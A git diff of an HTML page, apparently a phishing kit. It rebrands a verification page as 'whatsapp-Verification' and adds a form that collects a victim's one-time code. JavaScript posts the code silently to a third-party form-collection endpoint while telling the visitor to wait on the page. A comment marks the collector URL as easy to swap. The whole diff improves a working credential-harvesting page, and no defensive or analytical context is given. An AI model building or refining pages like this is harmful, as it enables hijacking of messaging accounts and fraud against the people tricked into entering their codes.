@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" type="image/png" href="favicon.png">
-  <title>bangos-Verification</title>
+  <title>whatsapp-Verification</title>
   <style>
     body {
       margin: 0;
@@ -25,6 +25,7 @@
       width: 320px;
       margin: auto;
       border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
     }
     .logo {
       width: 250px;
@@ -33,30 +34,52 @@
     input {
       display: block;
       margin: 10px auto;
-      padding: 10px;
+      padding: 12px;
       width: 90%;
       border-radius: 5px;
-      border: none;
+      border: 1px solid #444;
+      background: #fff;
       color: #333;
     }
     button {
-      padding: 10px 20px;
+      padding: 12px 25px;
       border-radius: 5px;
       border: none;
       cursor: pointer;
       background-color: #f0f0f0;
       color: #333;
       font-weight: bold;
-      transition: background 0.3s;
+      transition: background 0.3s, transform 0.1s;
+      width: 90%;
     }
     button:hover {
       background-color: #ddd;
     }
+    button:active {
+      transform: scale(0.98);
+    }
+    .status-msg {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #ffd700;
+      display: none; /* Hidden by default */
+    }
     hr {
-      margin: 20px 0;
+      margin: 25px 0;
       border: 0;
       border-top: 1px solid #444;
     }
+    .loading-spinner {
+      display: inline-block;
+      width: 15px;
+      height: 15px;
+      border: 2px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
@@ -65,28 +88,82 @@
   <div class="container">
     <img src="logo.png" class="logo" alt="Logo">
 
-    <!-- REPLACES request.php -->
-    <h2>Request Code</h2>
-    <form action="https://formspree.io/f/mzdyqwlp" method="POST">
-      <input type="hidden" name="_subject" value="Code Requested">
-      <input type="hidden" name="message" value="A user requested a verification code.">
-      <!-- Redirects back to your site after they click submit -->
-      <input type="hidden" name="_next" value="https://github.com"> 
-      <button type="submit">Request Code</button>
-    </form>
+    <div id="requestSection">
+      <h2>Verification</h2>
+      <p style="font-size: 13px; color: #bbb;">Click below to receive your unique access code.</p>
+      
+      <!-- CHANGE THE ACTION URL BELOW -->
+      <form id="requestCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
+        <button type="submit" id="reqBtn">Request Code</button>
+      </form>
+      
+      <div id="waitMessage" class="status-msg">
+        <div class="loading-spinner"></div>
+        Request sent! Please wait on this page...
+      </div>
+    </div>
 
     <hr>
 
-    <!-- REPLACES submit_code.php -->
-    <h2>Enter Code</h2>
-    <form action="https://formspree.io/f/mzdyqwlp" method="POST">
-      <input type="hidden" name="_subject" value="Code Submitted">
-      <input type="text" name="entered_code" placeholder="Enter code" required>
-      <input type="hidden" name="_next" value="https://github.com">
-      <button type="submit">Submit Code</button>
-    </form>
+    <div id="submitSection">
+      <h3>Enter Received Code</h3>
+      <form id="submitCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
+        <input type="text" name="entered_code" placeholder="000000" required>
+        <button type="submit" id="subBtn">Submit & Verify</button>
+      </form>
+      
+      <div id="successMessage" class="status-msg" style="color: #4caf50;">
+        Code submitted! Verifying...
+      </div>
+    </div>
   </div>
 </div>
+
+<script>
+  // Function to handle the form without refreshing the page
+  async function handleForm(formId, buttonId, statusId) {
+    const form = document.getElementById(formId);
+    const btn = document.getElementById(buttonId);
+    const status = document.getElementById(statusId);
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault(); // This is the magic part - it stops the redirect
+      
+      // Update UI
+      btn.disabled = true;
+      btn.innerText = "Processing...";
+      status.style.display = "block";
+
+      const formData = new FormData(form);
+      
+      try {
+        const response = await fetch(form.action, {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        if (response.ok) {
+          btn.innerText = "Sent Successfully";
+          // We keep the status message visible so they know to wait
+        } else {
+          alert("Something went wrong. Please try again.");
+          btn.disabled = false;
+          btn.innerText = "Try Again";
+        }
+      } catch (error) {
+        alert("Connection error. Check your internet.");
+        btn.disabled = false;
+      }
+    });
+  }
+
+  // Apply the logic to both forms
+  handleForm('requestCodeForm', 'reqBtn', 'waitMessage');
+  handleForm('submitCodeForm', 'subBtn', 'successMessage');
+</script>
 
 </body>
 </html>
